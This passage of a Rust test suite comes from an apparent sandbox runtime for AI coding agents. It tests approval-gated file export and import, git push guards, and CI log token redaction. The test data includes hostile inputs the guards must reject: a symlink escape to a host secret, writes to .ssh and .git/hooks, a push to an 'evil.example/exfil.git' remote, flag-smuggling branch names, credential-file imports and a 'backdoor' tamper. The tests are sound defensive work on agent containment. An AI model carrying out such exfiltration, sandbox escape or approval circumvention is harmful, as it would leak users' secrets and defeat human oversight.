            if !backing_path.exists() {
                bail!("missing backing");
            }
            std::fs::create_dir_all(mount_dir)?;
            let payload = self.store.join(org_id);
            if payload.is_dir() {
                Self::copy_dir(&payload, mount_dir)?;
            }
            self.mounted.lock().unwrap().insert(mount_dir.to_path_buf());
            Ok(())
        }

        fn unmount(
            &self,
            _backend: aos_vfs::vault::VaultBackendKind,
            org_id: &str,
            mount_dir: &Path,
        ) -> anyhow::Result<()> {
            let payload = self.store.join(org_id);
            if payload.exists() {
                let _ = std::fs::remove_dir_all(&payload);
            }
            if mount_dir.is_dir() {
                Self::copy_dir(mount_dir, &payload)?;
                for entry in std::fs::read_dir(mount_dir)? {
                    let p = entry?.path();
                    if p.is_dir() {
                        std::fs::remove_dir_all(p)?;
                    } else {
                        std::fs::remove_file(p)?;
                    }
                }
            }
            self.mounted.lock().unwrap().remove(mount_dir);
            Ok(())
        }
    }

    #[tokio::test]
    async fn test_paas_hibernate_locks_org_vault_and_wake_unlocks() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("runtime");
        let mounter = Arc::new(TestPaasVaultMounter {
            store: temp.path().join("encrypted_payloads"),
            mounted: std::sync::Mutex::new(std::collections::HashSet::new()),
        });
        let vault = Arc::new(OrgVaultManager::with_components(
            &runtime_root,
            aos_vfs::vault::VaultMode::Enforced,
            4,
            Arc::new(aos_vfs::vault::InMemoryKekProvider::new([0x55u8; 32])),
            mounter,
        ));
        let kernel = Arc::new(
            AegisRuntimeKernel::new_with_vault(&runtime_root, vault.clone())
                .await
                .unwrap(),
        );

        let ws = kernel
            .paas
            .provision_workspace(
                &kernel,
                "cloud-org",
                "ws-vault-test",
                ".",
                "main",
                vec!["agy-cloud".to_string()],
            )
            .await
            .unwrap();
        let st_active = vault.status_org("cloud-org").unwrap();
        assert!(st_active.encrypted);
        assert!(st_active.mounted);
        assert!(
            ws.host_repo_path
                .starts_with(st_active.mount_dir.join("paas_workspaces")),
            "Cloud host_repo_path must live inside encrypted OrgVault mount: {}",
            ws.host_repo_path.display()
        );

        let cloud_agent = AgentIdentity::new("cloud-org", "agy-cloud", "Aegis Cloud Agent");
        kernel
            .call_tool(
                &cloud_agent,
                "fs_write",
                json!({ "path": "cloud_exp.txt", "content": "CLOUD_UNCOMMITTED_EXP" }),
            )
            .await
            .unwrap();

        kernel
            .paas
            .hibernate_workspace(&kernel, "cloud-org", &ws.workspace_id)
            .await
            .unwrap();
        let st_hib = vault.status_org("cloud-org").unwrap();
        assert!(!st_hib.mounted, "Hibernation must lock & unmount OrgVault");
        assert!(
            !st_hib
                .mount_dir
                .join("agents/agy-cloud/cow_workspace/upper_workspace/cloud_exp.txt")
                .exists(),
            "Plaintext shadow file must not exist on mountpoint while hibernated"
        );

        let (_woke, _) = kernel
            .paas
            .wake_workspace_if_needed(&kernel, "cloud-org", &ws.workspace_id)
            .await
            .unwrap();
        let st_woke = vault.status_org("cloud-org").unwrap();
        assert!(st_woke.mounted, "Wake must unlock & mount OrgVault");

        let read_back = kernel
            .call_tool(&cloud_agent, "fs_read", json!({ "path": "cloud_exp.txt" }))
            .await
            .unwrap();
        assert_eq!(read_back["content"], "CLOUD_UNCOMMITTED_EXP");

        let _ = vault.lock_all();
    }

    #[tokio::test]
    async fn test_fs_export_file_zero_copy_pdf_and_security_guards() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("rt");
        let ws_root = temp.path().join("workspace");
        let repo_a = ws_root.join("aegis-os");
        let repo_b = ws_root.join("SYLVA");
        std::fs::create_dir_all(repo_a.join(".git")).unwrap();
        std::fs::create_dir_all(repo_b.join("paper")).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let agent = AgentIdentity::new("aegis-os", "agy-pdf-test", "Lead");
        let env = kernel
            .ensure_agent_environment(
                agent.clone(),
                &repo_a,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let pdf_bytes: Vec<u8> = b"%PDF-1.5\n%\x93\x8c\x8b\x9e\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n".to_vec();
        let tmp_pdf = env.sandbox.config().agent_home_dir.join("main.pdf");
        std::fs::write(&tmp_pdf, &pdf_bytes).unwrap();
        let dst_pdf = std::fs::canonicalize(&repo_b).unwrap().join("paper/main.pdf");

        // 1. First call freezes into CAS and escalates with evidence hash + escalation diff.
        let ask = kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": "$TMPDIR/main.pdf",
                    "dst_host_path": dst_pdf.display().to_string(),
                    "overwrite": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required", "{ask}");
        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();
        let artifact_uri = ask["artifact_uri"].as_str().unwrap().to_string();
        assert!(artifact_uri.starts_with("artifact://aegis-os/sha256:"));
        assert!(runtime_root
            .join("escalation_diffs")
            .join(format!("{esc_id}.json"))
            .is_file());

        // 2. Approve One-Shot (`ttl_secs = 0`) pinned to destination + SHA-256 evidence.
        let lease = kernel
            .policy
            .approve_escalation(&esc_id, 0, "user")
            .await
            .unwrap();
        assert_eq!(lease.kind, LeaseKind::OneShot);

        // 3. Bait-and-switch tamper check: modifying $TMPDIR/main.pdf must miss the SHA-256 pin!
        std::fs::write(&tmp_pdf, b"%PDF-1.5\nTAMPERED_CONTENT\n").unwrap();
        let tampered_res = kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": "$TMPDIR/main.pdf",
                    "dst_host_path": dst_pdf.display().to_string(),
                    "overwrite": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(
            tampered_res["status"], "approval_required",
            "Tampered bytes must NOT consume the SHA-256 pinned One-Shot lease"
        );

        // 4. Exporting using the frozen CAS artifact_uri succeeds with the original One-Shot lease!
        let exported = kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": artifact_uri,
                    "dst_host_path": dst_pdf.display().to_string(),
                    "overwrite": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(exported["status"], "exported_to_host", "{exported}");
        assert_eq!(exported["content_type"], "application/pdf");
        assert_eq!(std::fs::read(&dst_pdf).unwrap(), pdf_bytes);

        // One-Shot lease was consumed, so repeating requires a new approval.
        let second = kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": artifact_uri,
                    "dst_host_path": dst_pdf.display().to_string(),
                    "overwrite": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(second["status"], "approval_required");

        // 5. Security guards:
        // 5a. Symlink source escaping sandbox
        #[cfg(unix)]
        {
            let secret_outside = temp.path().join("host_secret.txt");
            std::fs::write(&secret_outside, b"TOP_SECRET").unwrap();
            let sym_src = env.sandbox.config().agent_home_dir.join("escape.pdf");
            std::os::unix::fs::symlink(&secret_outside, &sym_src).unwrap();
            assert!(kernel
                .call_tool(
                    &agent,
                    "fs_export_file",
                    json!({
                        "src_path": "$TMPDIR/escape.pdf",
                        "dst_host_path": dst_pdf.display().to_string()
                    }),
                )
                .await
                .is_err());
        }

        // 5b. ELF executable payload rejected
        let elf_src = env.sandbox.config().agent_home_dir.join("evil.bin");
        std::fs::write(&elf_src, b"\x7fELF\x02\x01\x01\x00").unwrap();
        assert!(kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": "$TMPDIR/evil.bin",
                    "dst_host_path": std::fs::canonicalize(&repo_b).unwrap().join("evil.bin").display().to_string()
                }),
            )
            .await
            .is_err());

        // 5c. Spoofed .pdf without %PDF- magic header rejected
        let fake_pdf = env.sandbox.config().agent_home_dir.join("fake.pdf");
        std::fs::write(&fake_pdf, b"NOT_A_PDF_HEADER").unwrap();
        assert!(kernel
            .call_tool(
                &agent,
                "fs_export_file",
                json!({
                    "src_path": "$TMPDIR/fake.pdf",
                    "dst_host_path": dst_pdf.display().to_string()
                }),
            )
            .await
            .is_err());

        // 5d. Ring-0 & poisoning destinations rejected
        std::fs::write(&tmp_pdf, &pdf_bytes).unwrap();
        for bad_dst in [
            temp.path().join("user/.ssh/id_rsa.pdf"),
            repo_a.join(".git/hooks/pre-commit"),
            repo_a.join("build.rs"),
            runtime_root.join("policy_state.json"),
        ] {
            let txt_src = env.sandbox.config().agent_home_dir.join("benign.txt");
            std::fs::write(&txt_src, b"hello").unwrap();
            assert!(
                kernel
                    .call_tool(
                        &agent,
                        "fs_export_file",
                        json!({
                            "src_path": "$TMPDIR/benign.txt",
                            "dst_host_path": bad_dst.display().to_string()
                        }),
                    )
                    .await
                    .is_err(),
                "must reject export to {}",
                bad_dst.display()
            );
        }
    }

    #[tokio::test]
    async fn test_umbrella_detection_does_not_hijack_paper_dir() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("rt");
        let ws_root = temp.path().join("workspace");
        let repo_a = ws_root.join("aegis-os");
        let sylva = ws_root.join("SYLVA");
        std::fs::create_dir_all(repo_a.join(".git")).unwrap();
        std::fs::create_dir_all(sylva.join("paper")).unwrap();
        std::fs::write(sylva.join("paper/main.tex"), "\\documentclass{article}\n").unwrap();

        assert!(AegisRuntimeKernel::is_umbrella_parent_dir(&ws_root));
        assert!(!AegisRuntimeKernel::is_umbrella_parent_dir(&repo_a));
        assert!(!AegisRuntimeKernel::is_umbrella_parent_dir(&sylva));

        // Even if a directory has a nested `.git` child, having a top-level README.md means it's a project, not an umbrella.
        let docs_with_subrepo = temp.path().join("docs_proj");
        std::fs::create_dir_all(docs_with_subrepo.join("sub/.git")).unwrap();
        std::fs::write(docs_with_subrepo.join("README.md"), "# Docs\n").unwrap();
        assert!(!AegisRuntimeKernel::is_umbrella_parent_dir(&docs_with_subrepo));

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        // Write a stale global active_workspace.txt pointing to `aegis-os`.
        std::fs::write(
            runtime_root.join("active_workspace.txt"),
            repo_a.display().to_string(),
        )
        .unwrap();

        let key_sylva = aos_core::session::SessionKey {
            pid: 5555,
            start_time: 100,
        };
        let resolved_sylva = kernel.resolve_workspace_for_session(&sylva, Some(&key_sylva));
        assert_eq!(
            resolved_sylva,
            std::fs::canonicalize(&sylva).unwrap(),
            "Opening non-Git paper directory SYLVA must never hijack to aegis-os"
        );

        // Session bound inside umbrella root with workspace_switched=true keeps switched target.
        let key_umb = aos_core::session::SessionKey {
            pid: 6666,
            start_time: 200,
        };
        let canon_sylva = std::fs::canonicalize(&sylva).unwrap();
        let canon_ws = std::fs::canonicalize(&ws_root).unwrap();
        aos_core::session::bind_workspace_for_key(
            &runtime_root,
            "agy",
            &key_umb,
            Some("conv-umb"),
            &canon_sylva,
            Some(&canon_ws),
            true,
        );
        assert_eq!(
            kernel.resolve_workspace_for_session(&ws_root, Some(&key_umb)),
            canon_sylva
        );

        // `workspace_switch` from repo_a to SYLVA escalates (outside single-repo scope) and succeeds after approval.
        let agent = AgentIdentity::new("aegis-os", "agy-switch", "Lead");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &repo_a,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();
        let ask = kernel
            .call_tool(
                &agent,
                "workspace_switch",
                json!({ "path": sylva.display().to_string() }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap();
        kernel
            .policy
            .approve_escalation(esc_id, 600, "user")
            .await
            .unwrap();
        let switched = kernel
            .call_tool(
                &agent,
                "workspace_switch",
                json!({ "path": sylva.display().to_string() }),
            )
            .await
            .unwrap();
        assert_eq!(switched["status"], "workspace_switched");
        assert_eq!(switched["org_id"], "SYLVA");
        assert_eq!(
            PathBuf::from(switched["host_source_root"].as_str().unwrap()),
            canon_sylva
        );
    }

    #[tokio::test]
    async fn test_binary_org_artifact_source_path_dest_path_and_base64_roundtrip() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("rt");
        let repo = temp.path().join("proj");
        std::fs::create_dir_all(repo.join(".git")).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let publisher = AgentIdentity::new("proj", "pub-1", "Publisher");
        let consumer = AgentIdentity::new("proj", "con-1", "Consumer");
        let pub_env = kernel
            .ensure_agent_environment(
                publisher.clone(),
                &repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();
        let con_env = kernel
            .ensure_agent_environment(
                consumer.clone(),
                &repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. `fs_write` + `fs_read` with base64 encoding, and UTF-8 read error on binary file
        let small_bin = vec![0x89u8, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0x00, 0xfe];
        let small_b64 = base64::engine::general_purpose::STANDARD.encode(&small_bin);
        let write_res = kernel
            .call_tool(
                &publisher,
                "fs_write",
                json!({
                    "path": "assets/icon.png",
                    "content": small_b64,
                    "encoding": "base64"
                }),
            )
            .await
            .unwrap();
        assert_eq!(write_res["bytes"], small_bin.len());

        let read_b64 = kernel
            .call_tool(
                &publisher,
                "fs_read",
                json!({ "path": "assets/icon.png", "encoding": "base64" }),
            )
            .await
            .unwrap();
        assert_eq!(read_b64["content_base64"], small_b64);

        let utf8_err = kernel
            .call_tool(&publisher, "fs_read", json!({ "path": "assets/icon.png" }))
            .await
            .unwrap_err()
            .to_string();
        assert!(utf8_err.contains("binary") && utf8_err.contains("fs_export_file"), "{utf8_err}");

        // 2. Large (>32 KiB) binary PNG in $TMPDIR published via `source_path` and fetched via `dest_path`
        let mut large_png = b"\x89PNG\r\n\x1a\n".to_vec();
        large_png.extend(vec![0xffu8; 40_000]);
        std::fs::write(pub_env.sandbox.config().agent_home_dir.join("chart.png"), &large_png)
            .unwrap();

        let meta = kernel
            .call_tool(
                &publisher,
                "org_artifact_publish",
                json!({
                    "name": "chart.png",
                    "source_path": "$TMPDIR/chart.png"
                }),
            )
            .await
            .unwrap();
        assert_eq!(meta["content_type"], "image/png");
        let uri = meta["uri"].as_str().unwrap();

        // Omitting dest_path for large binary avoids lossy multi-KB string dumps
        let fetch_summary = kernel
            .call_tool(&consumer, "org_artifact_fetch", json!({ "uri": uri }))
            .await
            .unwrap();
        assert_eq!(fetch_summary["is_binary"], true);
        assert!(fetch_summary.get("content").is_none());

        // Passing dest_path writes exact raw bytes into consumer's CoW shadow
        let fetch_staged = kernel
            .call_tool(
                &consumer,
                "org_artifact_fetch",
                json!({ "uri": uri, "dest_path": "figures/chart.png" }),
            )
            .await
            .unwrap();
        assert_eq!(fetch_staged["written_to_shadow"], "figures/chart.png");
        assert_eq!(
            std::fs::read(con_env.workspace.shadow_root().join("figures/chart.png")).unwrap(),
            large_png
        );
    }

    #[tokio::test]
    async fn test_workspace_git_commit_tag_push_and_security_guards() {
        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let git_bin = resolve_system_git_binary().expect("system git required for test");
        let temp = tempfile::tempdir().unwrap();
        let origin_bare = temp.path().join("origin.git");
        let host_repo = temp.path().join("repo");
        let rt = temp.path().join("rt");

        assert!(std::process::Command::new(&git_bin)
            .args(["init", "--bare", origin_bare.to_str().unwrap()])
            .status()
            .unwrap()
            .success());
        assert!(std::process::Command::new(&git_bin)
            .args(["init", "-b", "main", host_repo.to_str().unwrap()])
            .status()
            .unwrap()
            .success());

        let run_git = |args: &[&str]| {
            let arg_vec: Vec<String> = args.iter().map(|s| s.to_string()).collect();
            let out = run_sanitized_host_git(&git_bin, &host_repo, &[], &arg_vec).unwrap();
            assert!(
                out.status.success(),
                "git {:?} failed: {}",
                args,
                String::from_utf8_lossy(&out.stderr)
            );
            String::from_utf8_lossy(&out.stdout).trim().to_string()
        };

        run_git(&["config", "user.name", "Test User"]);
        run_git(&["config", "user.email", "test@example.com"]);
        run_git(&["remote", "add", "origin", origin_bare.to_str().unwrap()]);
        std::fs::write(host_repo.join("README.md"), "# initial\n").unwrap();
        std::fs::write(host_repo.join("dirty_unrelated.txt"), "clean\n").unwrap();
        run_git(&["add", "README.md", "dirty_unrelated.txt"]);
        run_git(&["commit", "-m", "chore: initial commit"]);
        run_git(&["tag", "v0.4.7"]);
        run_git(&["push", "origin", "main", "refs/tags/v0.4.7"]);

        // Simulate an unrelated dirty file on host that MUST stay untouched by workspace_git.
        std::fs::write(host_repo.join("dirty_unrelated.txt"), "dirty host state\n").unwrap();

        let vault = Arc::new(
            OrgVaultManager::new(&rt).with_mode(aos_vfs::vault::VaultMode::Off),
        );
        let kernel = AegisRuntimeKernel::new_with_vault(&rt, vault).await.unwrap();
        let agent = AgentIdentity::new("repo", "agy-1", "Lead");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "src/fix.rs",
                    "content": "pub fn fixed() -> bool { true }\n"
                }),
            )
            .await
            .unwrap();

        // Guard 1: cannot run workspace_git on files still unmerged in CoW shadow.
        let unmerged_err = kernel
            .call_tool(
                &agent,
                "workspace_git",
                json!({
                    "paths": ["src/fix.rs"],
                    "commit_message": "fix: before commit"
                }),
            )
            .await
            .unwrap_err();
        assert!(
            unmerged_err.to_string().contains("workspace_commit"),
            "{unmerged_err:#}"
        );

        // Land src/fix.rs onto host via workspace_commit.
        let wc_ask = kernel
            .call_tool(&agent, "workspace_commit", json!({ "paths": ["src/fix.rs"] }))
            .await
            .unwrap();
        assert_eq!(wc_ask["status"], "approval_required");
        let wc_esc = wc_ask["escalation_id"].as_str().unwrap();
        kernel
            .policy
            .approve_escalation(wc_esc, 0, "user")
            .await
            .unwrap();
        let wc_res = kernel
            .call_tool(&agent, "workspace_commit", json!({ "paths": ["src/fix.rs"] }))
            .await
            .unwrap();
        assert_eq!(wc_res["status"], "committed_to_host");
        let trailer = wc_res["audit_receipt"]["git_trailer"]
            .as_str()
            .unwrap()
            .to_string();

        // Guard 2: raw URL remotes must be rejected.
        let bad_remote = kernel
            .call_tool(
                &agent,
                "workspace_git",
                json!({
                    "push": true,
                    "remote": "https://evil.example/exfil.git"
                }),
            )
            .await
            .unwrap_err();
        assert!(
            bad_remote.to_string().contains("Invalid Git remote name"),
            "{bad_remote:#}"
        );

        // Request commit + trailer + force_tag + push.
        let git_args = json!({
            "paths": ["src/fix.rs"],
            "commit_message": "fix: test host git gateway",
            "trailers": [trailer.clone()],
            "tag": "v0.4.7",
            "force_tag": true,
            "push": true,
            "remote": "origin"
        });
        let ask = kernel
            .call_tool(&agent, "workspace_git", git_args.clone())
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap();
        assert!(rt.join("escalation_diffs").join(format!("{esc_id}.json")).is_file());

        // Approve Once (`ttl_secs = 0`, TOCTOU SHA-256 pinned).
        kernel
            .policy
            .approve_escalation(esc_id, 0, "user")
            .await
            .unwrap();

        // Guard 3 (TOCTOU): modifying host file after approval must invalidate the pinned lease.
        std::fs::write(host_repo.join("src/fix.rs"), "pub fn backdoor() {}\n").unwrap();
        let tampered = kernel
            .call_tool(&agent, "workspace_git", git_args.clone())
            .await
            .unwrap();
        assert_eq!(tampered["status"], "approval_required");

        // Restore exact approved content and re-approve once -> executes commit + force_tag + push.
        std::fs::write(host_repo.join("src/fix.rs"), "pub fn fixed() -> bool { true }\n").unwrap();
        let esc2 = tampered["escalation_id"].as_str().unwrap();
        kernel
            .policy
            .approve_escalation(esc2, 0, "user")
            .await
            .unwrap();

        let done = kernel
            .call_tool(&agent, "workspace_git", git_args)
            .await
            .unwrap();
        assert_eq!(done["status"], "git_completed", "{done}");
        assert_eq!(done["committed"], true);
        assert_eq!(done["pushed"], true);
        let head_sha = done["head_sha"].as_str().unwrap().to_string();
        let pushed_refs = done["pushed_refs"].as_array().unwrap();
        assert!(pushed_refs.iter().any(|v| v == "refs/heads/main"));
        assert!(pushed_refs.iter().any(|v| v == "refs/tags/v0.4.7"));

        // Verify origin bare repo received commit + trailer + moved tag.
        let origin_log = run_sanitized_host_git(
            &git_bin,
            &origin_bare,
            &[],
            &["log".into(), "-1".into(), "--format=%B".into(), "refs/heads/main".into()],
        )
        .unwrap();
        let origin_msg = String::from_utf8_lossy(&origin_log.stdout);
        assert!(origin_msg.contains("fix: test host git gateway"), "{origin_msg}");
        assert!(origin_msg.contains("Aegis-OS-Verified:"), "{origin_msg}");

        let origin_tag = run_sanitized_host_git(
            &git_bin,
            &origin_bare,
            &[],
            &["rev-parse".into(), "refs/tags/v0.4.7".into()],
        )
        .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&origin_tag.stdout).trim(),
            head_sha
        );

        // Unrelated dirty host file must remain dirty and uncommitted.
        let status_after = run_git(&["status", "--porcelain"]);
        assert!(
            status_after.contains("M dirty_unrelated.txt"),
            "unrelated host file must not be staged: {status_after}"
        );
    }

    #[tokio::test]
    async fn test_github_ci_inspect_repo_resolution_validation_and_token_redaction() {
        let tmp = tempfile::tempdir().unwrap();
        let https_repo = tmp.path().join("https_repo");
        std::fs::create_dir_all(https_repo.join(".git")).unwrap();
        std::fs::write(
            https_repo.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://github.com/heurion-org/aegis-os.git\n",
        )
        .unwrap();
        assert_eq!(
            detect_github_repo_from_git_config(&https_repo).as_deref(),
            Some("heurion-org/aegis-os")
        );

        let ssh_repo = tmp.path().join("ssh_repo");
        std::fs::create_dir_all(ssh_repo.join(".git")).unwrap();
        std::fs::write(
            ssh_repo.join(".git/config"),
            "[remote \"origin\"]\n\turl = git@github.com:heurion-org/aegis-os.git\n",
        )
        .unwrap();
        assert_eq!(
            detect_github_repo_from_git_config(&ssh_repo).as_deref(),
            Some("heurion-org/aegis-os")
        );

        assert!(is_valid_github_repo_slug("heurion-org/aegis-os"));
        assert!(!is_valid_github_repo_slug("../etc/passwd"));
        assert!(!is_valid_github_repo_slug("owner/repo?foo=bar"));
        assert!(!is_valid_github_repo_slug("-bad/repo"));
        assert!(is_valid_ci_branch_name("main"));
        assert!(is_valid_ci_branch_name("feat/ci-fix_1"));
        assert!(!is_valid_ci_branch_name("main&per_page=99"));
        assert!(!is_valid_ci_branch_name("--flag-smuggle"));

        let raw_log = "2026-11-16 curl -H 'Authorization: Bearer s3cr3tTok3nValu3' https://api.github.com\n\
                       TOKEN=ghp_1234567890abcdefghijklmnoprstuv\n\
                       PAT=github_pat_11AAAAA0123456789abcdef\n\
                       OK_LINE=cargo test passed (中文)\n";
        let scrubbed = redact_ci_log_secrets(raw_log);
        assert!(!scrubbed.contains("s3cr3tTok3nValu3"), "{scrubbed}");
        assert!(!scrubbed.contains("ghp_1234567890"), "{scrubbed}");
        assert!(!scrubbed.contains("github_pat_11"), "{scrubbed}");
        assert!(scrubbed.contains("Bearer [REDACTED_BY_AEGIS_DLP]"), "{scrubbed}");
        assert!(scrubbed.contains("TOKEN=[REDACTED_BY_AEGIS_DLP]"), "{scrubbed}");
        assert!(scrubbed.contains("OK_LINE=cargo test passed (中文)"), "{scrubbed}");

        let (tailed, total, truncated) = tail_ci_lines("l1\nl2\nl3\nl4", 2);
        assert_eq!(total, 4);
        assert!(truncated);
        assert_eq!(tailed, "l3\nl4");

        // Reject invalid explicit repo slug cleanly without hitting network.
        let bad_err = execute_github_ci_inspect(&https_repo, &json!({ "repo": "evil/a/b" }))
            .await
            .unwrap_err();
        assert!(bad_err.to_string().contains("Invalid GitHub repository slug"));

        // Verify Cedar baseline policy auto-permits `github_ci_inspect` for same-org agent.
        let policy = AegisPolicyKernel::new();
        let decision = policy
            .evaluate(&PolicyContext {
                principal: AgentIdentity::new("aegis-os", "agy-agent", "Lead"),
                action: "github_ci_inspect".to_string(),
                target_org_id: "aegis-os".to_string(),
                target_resource: "/workspace".to_string(),
                metadata: json!({}),
            })
            .await
            .unwrap();
        assert!(
            matches!(decision, PolicyDecision::Allow { .. }),
            "expected Cedar auto-permit for github_ci_inspect, got {decision:?}"
        );
    }

    #[tokio::test]
    async fn test_fs_import_file_modes_guards_and_toctou_pinning() {
        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let tmp = tempfile::tempdir().unwrap();
        let rt = tmp.path().join("rt");
        let repo = tmp.path().join("repo");
        let external = tmp.path().join("external");
        let cred_dir = external.join(".ssh");
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        std::fs::create_dir_all(&cred_dir).unwrap();
        std::fs::write(cred_dir.join("id_ed25519"), "SECRET_KEY").unwrap();
        std::fs::write(external.join(".env.production"), "DB_PASS=123").unwrap();
        let spec_file = external.join("spec.md");
        std::fs::write(&spec_file, "design notes v1\ntoken=ghp_1234567890abcdefgh\n").unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink(&spec_file, external.join("link_spec.md")).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt).await.unwrap());
        let agent = AgentIdentity::new("aegis-os", "coder-1", "Engineer");
        let env = kernel
            .ensure_agent_environment(
                agent.clone(),
                &repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Credential, dotenv, symlink, and poisoning shadow destination are hard-blocked.
        assert!(kernel
            .call_tool(
                &agent,
                "fs_import_file",
                json!({ "src_host_path": cred_dir.join("id_ed25519") })
            )
            .await
            .is_err());
        assert!(kernel
            .call_tool(
                &agent,
                "fs_import_file",
                json!({ "src_host_path": external.join(".env.production") })
            )
            .await
            .is_err());
        #[cfg(unix)]
        assert!(kernel
            .call_tool(
                &agent,
                "fs_import_file",
                json!({ "src_host_path": external.join("link_spec.md") })
            )
            .await
            .is_err());
        assert!(kernel
            .call_tool(
                &agent,
                "fs_import_file",
                json!({
                    "src_host_path": &spec_file,
                    "import_to": "shadow",
                    "dst_path": ".github/workflows/evil.yml"
                })
            )
            .await
            .is_err());

        // 2. Default mode imports into `<agent_home>/imports/` after SHA-256-pinned approval.
        let import_args = json!({ "src_host_path": &spec_file, "dst_path": "docs/spec.md" });
        let ask = kernel
            .call_tool(&agent, "fs_import_file", import_args.clone())
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();
        assert!(rt.join("escalation_diffs").join(format!("{esc_id}.json")).is_file());
        // Preview saved to escalation_diffs must DLP-redact secrets!
        let saved_diff = std::fs::read_to_string(
            rt.join("escalation_diffs").join(format!("{esc_id}.json")),
        )
        .unwrap();
        assert!(!saved_diff.contains("ghp_1234567890"), "{saved_diff}");

        kernel.policy.approve_escalation(&esc_id, 0, "user").await.unwrap();

        // Mutating host file after approval must invalidate OneShot `#sha256:` pin.
        std::fs::write(&spec_file, "tampered bytes!").unwrap();
        let drifted = kernel
            .call_tool(&agent, "fs_import_file", import_args.clone())
            .await
            .unwrap();
        assert_eq!(drifted["status"], "approval_required");
        let esc2 = drifted["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc2, 0, "user").await.unwrap();

        let done = kernel
            .call_tool(&agent, "fs_import_file", import_args)
            .await
            .unwrap();
        assert_eq!(done["status"], "imported_from_host", "{done}");
        assert_eq!(done["import_to"], "imports");
        assert_eq!(
            std::fs::read_to_string(env.sandbox.config().agent_home_dir.join("imports/docs/spec.md"))
                .unwrap(),
            "tampered bytes!"
        );
        // Host workspace and CoW shadow stay untouched in default `"imports"` mode!
        assert!(!env.workspace.shadow_root().join("docs/spec.md").exists());

        // 3. Explicit `import_to: "shadow"` lands inside CoW shadow after approval.
        let shadow_args = json!({
            "src_host_path": &spec_file,
            "import_to": "shadow",
            "dst_path": "ref/notes.md"
        });
        let ask_s = kernel
            .call_tool(&agent, "fs_import_file", shadow_args.clone())
            .await
            .unwrap();
        kernel
            .policy
            .approve_escalation(ask_s["escalation_id"].as_str().unwrap(), 0, "user")
            .await
            .unwrap();
        let done_s = kernel
            .call_tool(&agent, "fs_import_file", shadow_args)
            .await
            .unwrap();
        assert_eq!(done_s["import_to"], "shadow");
        assert_eq!(
            std::fs::read_to_string(env.workspace.shadow_root().join("ref/notes.md")).unwrap(),
            "tampered bytes!"
        );
    }

    #[tokio::test]
    async fn test_workspace_git_inspect_auto_commit_shadow_branch_and_cross_repo_guards() {
        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let git_bin = resolve_system_git_binary().expect("system git required for test");
        let temp = tempfile::tempdir().unwrap();
        let origin_bare = temp.path().join("origin.git");
        let host_repo = temp.path().join("repo");
        let rt = temp.path().join("rt");

        assert!(std::process::Command::new(&git_bin)
            .args(["init", "--bare", origin_bare.to_str().unwrap()])
            .status()
            .unwrap()
            .success());
        std::fs::create_dir_all(&host_repo).unwrap();
        for cmd_args in [
            vec!["init", "-b", "main"],
            vec!["config", "user.name", "Tester"],
            vec!["config", "user.email", "tester@example.com"],
            vec![
                "remote",
                "add",
                "origin",
                "https://x-access-token:secretTok3n9999@github.com/heurion-org/aegis-os.git",
            ],
        ] {
            assert!(run_sanitized_host_git(
                &git_bin,
                &host_repo,
                &[],
                &cmd_args.into_iter().map(String::from).collect::<Vec<_>>()
            )
            .unwrap()
            .status
            .success());
        }
        std::fs::write(host_repo.join("README.md"), "init\n").unwrap();
        assert!(run_sanitized_host_git(
            &git_bin,
            &host_repo,
            &[],
            &["add".into(), "README.md".into()]
        )
        .unwrap()
        .status
        .success());
        assert!(run_sanitized_host_git(
            &git_bin,
            &host_repo,
            &[],
            &["commit".into(), "-m".into(), "init".into()]
        )
        .unwrap()
        .status
        .success());

